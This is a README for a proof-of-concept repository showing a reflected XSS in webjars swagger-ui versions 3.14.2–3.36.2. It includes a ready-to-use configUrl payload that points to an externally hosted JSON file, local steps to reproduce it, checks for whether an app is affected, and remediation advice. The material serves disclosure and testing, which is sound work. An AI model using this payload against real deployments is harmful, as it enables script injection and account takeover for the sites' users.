# WebJars Swagger XSS PoC

## Credit and Thanks
Example application was copied from: [https://github.com/http4k/examples/tree/master/hello-world](https://github.com/http4k/examples/tree/master/hello-world)

Credit to the http4k team for [maintaining simple, easy-to-use docs](https://www.http4k.org/guide/howto/deploy_webjars/) on setting up a quick web app to show off webjars.

## Quick Details
**Package**: [org.webjars:swagger-ui](https://mvnrepository.com/artifact/org.webjars/swagger-ui)

**Versions Affected**: [3.14.2, 3.36.2]

**Type of Issue**: [Reflected XSS](https://owasp.org/www-community/attacks/xss/)

**Payload/PoC**: `?configUrl=https://xss.smarpo.com/test.json` -- Append this to end of the Swagger UI URL and an alert dialog should fire.

* eg. `https://example.com/webjars/swagger-ui/3.14.2/index.html?configUrl=https://xss.smarpo.com/test.json`

## Am I vulnerable?
If your application includes the `org.webjars:swagger-ui` package within the stated vulnerable versions AND you make the
Swagger UI "routable" (aka, it can be loaded in a browser), your application has an XSS issue.

For example, if your app includes `org.webjars:swagger-ui:3.36.2` and your Swagger UI is available at https://localhost/swagger -- you are vulnerable.

For example, if your app includes `org.webjars:swagger-ui:3.17.6` and your Swagger UI is available at: https://example.com/swagger/swagger-ui -- you are vulnerable.

## About
The Swagger UI is commonly included in applications to allow for visually viewing a service's OpenAPI API documentation via
a convenient web-interface. Older versions of the Swagger UI suffer from known XSS issues. WebJars merely serve as a way
to package up common frontend code and provide it as a clean JVM-based dependency to avoid needing to manage frontend
dependency management on top of backend dependencies.

This particular vulnerability was originally found and described by: [https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)

## Running the PoC

You will need JDK 11 and Docker available for easiest running of PoC.

### With docker

1. Run: `./build_and_run.sh`
2. Navigate to: http://localhost:8080/webjars/swagger-ui/3.36.2/index.html?configUrl=https://xss.smarpo.com/test.json

### Without docker

1. Run: `./gradlew clean distZip`
2. Run: `unzip build/distributions/Example.zip`
3. Run: `./Example/bin/Example`
4. Navigate to: http://localhost:8080/webjars/swagger-ui/3.36.2/index.html?configUrl=https://xss.smarpo.com/test.json


XSS Payloads are hosted at: [seanmarpo/swagger-xss-payloads](https://github.com/seanmarpo/swagger-xss-payloads)

## Remediation

* Update `org.webjars:swagger-ui` to a version higher than `3.36.2`
* Remove routing for the swagger-ui webjars such that they are not available for web access
